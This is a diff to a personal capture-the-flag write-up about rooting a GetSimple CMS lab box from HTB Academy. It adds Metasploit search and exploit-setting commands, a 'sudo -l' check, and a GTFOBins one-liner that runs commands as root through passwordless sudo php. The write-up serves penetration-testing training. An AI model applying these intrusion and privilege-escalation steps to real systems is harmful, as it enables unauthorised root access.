@@ -121,19 +121,29 @@ to the target but it wouldn't come out right.  I'm sure I'm just doing the code 
 Time to try a different path.  Break out Metasploit again and do a search for 'getsimple' and got two results
 back on that.
 
-![Metasploit Search](https://github.com/Colindy/PenWriteups/tree/main/Images/Metasearch.PNG)
+```
+search getsimple
+```
+
+![Metasploit Search](/Images/Metasearch.PNG)
 
 Of the two, I already used the first one to get the first flag, let's see what we can do with the second one.
 
 First things first, let's get this exploit set up and going.
 
-![Settings for exploit](/tree/main/Images/metasploit_setting.PNG)
+```
+set lhost <local ip>
+set rhosts <target ip>
+exploit
+```
+
+![Settings for exploit](/Images/metasploit_setting.PNG)
 
 And I'm in again.  So after some poking I remember the previous lesson and checking the following command:
 ```
 sudo -l
 ```
-![results from sudo -l](/tree/main/Images/sudoL.PNG)
+![results from sudo -l](/Images/sudoL.PNG)
 
 Well lookie lookie, seems I have found a sudo command that doesn't require sudo password.  PHP.  Go check out
 GTFObins github and find the following command for PHP sudo:
@@ -147,3 +157,6 @@ sudo php -r "system('$CMD');"
 And now I control ROOOOOOOOOOT!!!!!  That's how we roll.  Finish it up with some cmd lines and get that flag!!
 
 ![Root.txt flag](/Images/rootTXTflag.PNG)
+
+Well, that was fun.  Learned a lot with this one.  Not least of all, some tricks for doing these writeups.  I
+believe I'll be doing some more of these as I go through HTB Academy and work my way towards PenTesting!
